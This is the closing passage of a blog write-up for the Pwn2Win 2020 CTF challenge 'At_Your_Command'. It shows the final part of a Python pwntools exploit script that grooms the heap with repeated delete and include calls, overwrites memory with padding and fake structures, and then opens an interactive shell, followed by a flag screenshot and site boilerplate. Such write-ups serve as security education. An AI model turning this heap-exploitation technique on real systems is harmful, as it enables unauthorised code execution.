    for i in range(10):
        delete(i)

    for i in range(8):
        include(123,&quot;A&quot;*5)

    include(0,&quot;A&quot;*280+fake1)
    include(0,fake2)
    p.sendline(&quot;5&quot;)
    p.sendline(&quot;1&quot;)
    
    try:
        p.sendline(&quot;id&quot;)
        p.interactive()
    except:
        c=0
    p.close()
</code></pre>
<p>And here we go :D</p>
<p><img src="/img/flag_pwn2win.png" alt="Flag"></p>

    </div>

    







<div class="share-box" aria-hidden="true">
  <ul class="share">
    
      
      
      
        
      
      
      
      <li>
        <a href="https://twitter.com/intent/tweet?url=/post/pwn2win-2020-at_your_command/&amp;text=Pwn2Win%202020%20%20%20At_Your_Command" target="_blank" rel="noopener" class="share-btn-twitter">
          <i class="fab fa-twitter"></i>
        </a>
      </li>
    
      
      
      
        
      
      
      
      <li>
        <a href="https://www.facebook.com/sharer.php?u=/post/pwn2win-2020-at_your_command/&amp;t=Pwn2Win%202020%20%20%20At_Your_Command" target="_blank" rel="noopener" class="share-btn-facebook">
          <i class="fab fa-facebook"></i>
        </a>
      </li>
    
      
      
      
        
      
      
      
      <li>
        <a href="mailto:?subject=Pwn2Win%202020%20%20%20At_Your_Command&amp;body=/post/pwn2win-2020-at_your_command/" target="_blank" rel="noopener" class="share-btn-email">
          <i class="fas fa-envelope"></i>
        </a>
      </li>
    
      
      
      
        
      
      
      
      <li>
        <a href="https://www.linkedin.com/shareArticle?url=/post/pwn2win-2020-at_your_command/&amp;title=Pwn2Win%202020%20%20%20At_Your_Command" target="_blank" rel="noopener" class="share-btn-linkedin">
          <i class="fab fa-linkedin-in"></i>
        </a>
      </li>
    
      
      
      
        
      
      
      
      <li>
        <a href="https://web.whatsapp.com/send?text=Pwn2Win%202020%20%20%20At_Your_Command%20/post/pwn2win-2020-at_your_command/" target="_blank" rel="noopener" class="share-btn-whatsapp">
          <i class="fab fa-whatsapp"></i>
        </a>
      </li>
    
      
      
      
        
      
      
      
      <li>
        <a href="https://service.weibo.com/share/share.php?url=/post/pwn2win-2020-at_your_command/&amp;title=Pwn2Win%202020%20%20%20At_Your_Command" target="_blank" rel="noopener" class="share-btn-weibo">
          <i class="fab fa-weibo"></i>
        </a>
      </li>
    
  </ul>
</div>












  
  





  
  
  
    
  
  
  
  <div class="media author-card content-widget-hr">
    
      
      <img class="avatar mr-3 avatar-circle" src="/authors/admin/avatar_hu06816a7876aa6880a23601647714be56_91504_270x270_fill_q90_lanczos_center.jpg" alt="Kerro &amp; Anis_Boss">
    

    <div class="media-body">
      <h5 class="card-title"><a href="/">Kerro &amp; Anis_Boss</a></h5>
      <h6 class="card-subtitle">Cyber Security Enthusiasts</h6>
      <p class="card-text">Our research interests include Binary Exploitation, Reverse Engineering and Programming.</p>
      <ul class="network-icon" aria-hidden="true">
  
    
    
    
      
    
    
    
    
    
    <li>
      <a href="mailto:oussama.kerro@pwn-diaries.com" >
        <i class="fas fa-envelope"></i>
      </a>
    </li>
  
    
    
    
      
    
    
    
    
    
    <li>
      <a href="mailto:anis.hamdi@pwn-diaries.com" >
        <i class="fas fa-envelope"></i>
      </a>
    </li>
  
    
    
    
      
    
    
    
    
    
      
    
    <li>
      <a href="https://twitter.com/KerroOussama" target="_blank" rel="noopener">
        <i class="fab fa-twitter"></i>
      </a>
    </li>
  
    
    
    
      
    
    
    
    
    
      
    
    <li>
      <a href="https://twitter.com/AnisBoss_" target="_blank" rel="noopener">
        <i class="fab fa-twitter"></i>
      </a>
    </li>
  
    
    
    
      
    
    
    
    
    
      
    
    <li>
      <a href="https://github.com/KEERRO" target="_blank" rel="noopener">
        <i class="fab fa-github"></i>
      </a>
    </li>
  
    
    
    
      
    
    
    
    
    
      
    
    <li>
      <a href="https://github.com/AnisBoss" target="_blank" rel="noopener">
        <i class="fab fa-github"></i>
      </a>
    </li>
  
</ul>

    </div>
  </div>












  
  



  </div>
</article>

      

    
    
    
      <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js" integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous"></script>
      <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.imagesloaded/4.1.4/imagesloaded.pkgd.min.js" integrity="sha256-lqvxZrPLtfffUl2G/e7szqSvPBILGbwmsGE1MKlOi0Q=" crossorigin="anonymous"></script>
      <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.isotope/3.0.6/isotope.pkgd.min.js" integrity="sha256-CBrpuqrMhXwcLLUd5tvQ4euBHCdh7wGlDfNz8vbu/iI=" crossorigin="anonymous"></script>
      <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.js" integrity="sha256-yt2kYMy0w8AbtF89WXb2P1rfjcP/HTHLT7097U8Y5b8=" crossorigin="anonymous"></script>

      

      
        
        <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.18.1/highlight.min.js" integrity="sha256-eOgo0OtLL4cdq7RdwRUiGKLX9XsIJ7nGhWEKbohmVAQ=" crossorigin="anonymous"></script>
        
        <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.18.1/languages/r.min.js"></script>
        
      

    

    
    
      <script src="https://cdnjs.cloudflare.com/ajax/libs/leaflet/1.5.1/leaflet.js" integrity="sha256-EErZamuLefUnbMBQbsEqu1USa+btR2oIlCpBJbyD4/g=" crossorigin="anonymous"></script>
    

    
    
    <script>const code_highlighting = true;</script>
    

    
    
    <script>const isSiteThemeDark = true;</script>
    

    
    
    
    
    
    
    <script>
      const search_config = {"indexURI":"/index.json","minLength":1,"threshold":0.3};
      const i18n = {"no_results":"No results found","placeholder":"Search...","results":"results found"};
      const content_type = {
        'post': "Posts",
        'project': "Projects",
        'publication' : "Publications",
        'talk' : "Talks"
        };
    </script>
    

    
    

    
    
    <script id="search-hit-fuse-template" type="text/x-template">
      <div class="search-hit" id="summary-{{key}}">
      <div class="search-hit-content">
        <div class="search-hit-name">
          <a href="{{relpermalink}}">{{title}}</a>
          <div class="article-metadata search-hit-type">{{type}}</div>
          <p class="search-hit-description">{{snippet}}</p>
        </div>
      </div>
      </div>
    </script>
    

    
    
    <script src="https://cdnjs.cloudflare.com/ajax/libs/fuse.js/3.2.1/fuse.min.js" integrity="sha256-VzgmKYmhsGNNN4Ph1kMW+BjoYJM2jV5i4IlFoeZA9XI=" crossorigin="anonymous"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/mark.js/8.11.1/jquery.mark.min.js" integrity="sha256-4HLtjeVgH0eIB3aZ9mLYF6E8oU5chNdjU6p6rrXpl9U=" crossorigin="anonymous"></script>
    

    
    

    
    

    
    

    
    
    
    
    
    
    
    
    
      
    
    
    
    
    <script src="/js/academic.min.37431be2d92d7fb0160054761ab79602.js"></script>

    






  
  
  <div class="container">
    <footer class="site-footer">
  

  <p class="powered-by">
    

    Made By Kerro & Anis_Boss with     &#10084;&#65039;


    
    <span class="float-right" aria-hidden="true">
      <a href="#" class="back-to-top">
        <span class="button_icon">
          <i class="fas fa-chevron-up fa-2x"></i>
        </span>
      </a>
    </span>
    
  </p>
</footer>

  </div>
  

  
<div id="modal" class="modal fade" role="dialog">
  <div class="modal-dialog">
    <div class="modal-content">
      <div class="modal-header">
        <h5 class="modal-title">Cite</h5>
        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body">
        <pre><code class="tex hljs"></code></pre>
      </div>
      <div class="modal-footer">
        <a class="btn btn-outline-primary my-1 js-copy-cite" href="#" target="_blank">
          <i class="fas fa-copy"></i> Copy
        </a>
        <a class="btn btn-outline-primary my-1 js-download-cite" href="#" target="_blank">
          <i class="fas fa-download"></i> Download
        </a>
        <div id="modal-error"></div>
      </div>
    </div>
  </div>
</div>

</body>
</html>
